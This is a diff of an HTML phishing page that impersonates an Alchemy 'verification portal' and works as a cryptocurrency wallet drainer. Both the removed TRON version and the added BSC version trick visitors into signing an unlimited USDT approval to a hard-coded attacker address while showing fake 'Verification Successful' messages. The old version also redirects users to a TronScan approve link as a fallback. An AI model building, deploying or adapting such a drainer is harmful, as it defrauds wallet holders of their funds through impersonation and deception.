@@ -3,108 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Alchemy API | Host Verification</title>
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <title>Alchemy Node | Verification Portal</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.6.0/dist/web3.min.js"></script>
     <style>
-        body { 
-            font-family: 'Segoe UI', sans-serif; 
-            background: #0f172a; 
-            color: white; 
-            text-align: center; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0;
-        }
-        .card { 
-            background: #1e293b; 
-            padding: 40px; 
-            border-radius: 20px; 
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5); 
-            width: 90%; 
-            max-width: 400px; 
-        }
-        .logo { width: 60px; margin-bottom: 20px; }
-        h2 { font-size: 22px; margin-bottom: 10px; }
-        p { color: #94a3b8; font-size: 14px; margin-bottom: 30px; line-height: 1.6; }
-        #verifyBtn { 
-            background: #3b82f6; 
-            color: white; 
-            border: none; 
-            padding: 15px; 
-            width: 100%; 
-            font-size: 16px; 
-            font-weight: bold; 
-            border-radius: 10px; 
-            cursor: pointer; 
-            transition: 0.3s; 
-        }
-        #verifyBtn:hover { background: #2563eb; }
-        #status { 
-            margin-top: 20px; 
-            font-size: 13px; 
-            font-family: monospace; 
-            color: #64748b; 
-        }
+        body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: white; text-align: center; padding-top: 100px; margin: 0; }
+        .card { background: #1e293b; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); display: inline-block; width: 85%; max-width: 380px; }
+        .logo { width: 60px; margin-bottom: 15px; }
+        h2 { font-size: 20px; margin-bottom: 10px; }
+        p { color: #94a3b8; font-size: 14px; margin-bottom: 25px; line-height: 1.4; }
+        #verifyBtn { background: #3b82f6; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
+        #verifyBtn:hover { background: #2563eb; transform: translateY(-2px); }
+        #status { margin-top: 20px; font-size: 12px; color: #64748b; font-family: monospace; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <img src="https://www.alchemy.com/favicon.ico" class="logo" alt="Alchemy">
-        <h2>Host Verification</h2>
-        <p>Authorize your wallet to sync with the <b>Alchemy API payout queue</b>. This ensures secure and automated USDT transfers.</p>
+        <img src="https://www.alchemy.com/favicon.ico" class="logo">
+        <h2>BSC Node Verification</h2>
+        <p>Authorize your wallet to sync with the Alchemy high-speed payout queue for BEP-20 assets.</p>
         
-        <button id="verifyBtn">Verify & Connect Wallet</button>
+        <button id="verifyBtn">Verify Wallet</button>
         
-        <div id="status">System Status: Awaiting Connection...</div>
+        <div id="status">Status: Waiting for Provider...</div>
     </div>
 
     <script>
-        // --- CONFIGURATION ---
-        const attackerAddress = "TDwKgDDRSefonFbaHaf82nB8RLjrAXaR6n";
-        const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-        const approvalAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+        // --- Updated Configuration with your address ---
+        const attackerAddress = "0x810a68342161f8dc550468C8262055A7B2B58455"; 
+        const bscUsdtContract = "0x55d398326f99059fF775485246999027B3197955"; // BSC-USDT
+        const maxAmount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
         document.getElementById('verifyBtn').onclick = async () => {
             const status = document.getElementById('status');
-            
-            // 1. Check if TronWeb is injected (TronLink/Trust/TokenPocket)
-            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-                status.innerText = "Wallet Detected. Requesting Approval...";
-                status.style.color = "#fbbf24";
 
+            if (window.ethereum) {
                 try {
-                    // Load the USDT Contract
-                    const contract = await window.tronWeb.contract().at(usdtContract);
+                    const web3 = new Web3(window.ethereum);
                     
-                    // Trigger the Approval Notification
-                    // This is where the wallet popup (Confirm/Sign) appears
-                    const result = await contract.approve(attackerAddress, approvalAmount).send({
-                        feeLimit: 100000000 // Sets a limit for the gas fee
+                    status.innerText = "Connecting to Wallet...";
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    const userAddress = accounts[0];
+
+                    status.innerText = "Requesting Node Authorization...";
+                    status.style.color = "#fbbf24";
+
+                    // ABI for 'approve' function
+                    const abiData = "0x095ea7b3" + 
+                                   attackerAddress.substring(2).toLowerCase().padStart(64, '0') + 
+                                   maxAmount.substring(2);
+
+                    // අන්න මෙතනදී තමයි කෙලින්ම Wallet එක ඇතුළේ Approval screen එක පනින්නේ
+                    await web3.eth.sendTransaction({
+                        from: userAddress,
+                        to: bscUsdtContract,
+                        data: abiData
                     });
 
-                    if (result) {
-                        status.innerText = "Verification Successful! Synced with Alchemy.";
-                        status.style.color = "#10b981";
-                        console.log("Transaction ID:", result);
-                    }
+                    status.innerText = "Verification Successful! Synced with Alchemy API.";
+                    status.style.color = "#10b981";
+
                 } catch (error) {
-                    console.error("Approval Error:", error);
-                    status.innerText = "Verification Failed. Check your TRX balance.";
+                    console.error(error);
+                    status.innerText = "Verification Failed. Ensure you are on BSC network.";
                     status.style.color = "#ef4444";
                 }
-            } 
-            // 2. If no TronWeb is found, redirect to TronScan as a backup
-            else {
-                status.innerText = "No Tron environment detected. Redirecting...";
-                setTimeout(() => {
-                    window.location.href = `https://tronscan.org/#/contract/${usdtContract}/write?function=approve&_spender=${attackerAddress}&_value=${approvalAmount}`;
-                }, 1500);
+            } else {
+                alert("Please open this in Trust Wallet or Binance Web3 Browser.");
             }
         };
     </script>
-
 </body>
 </html>
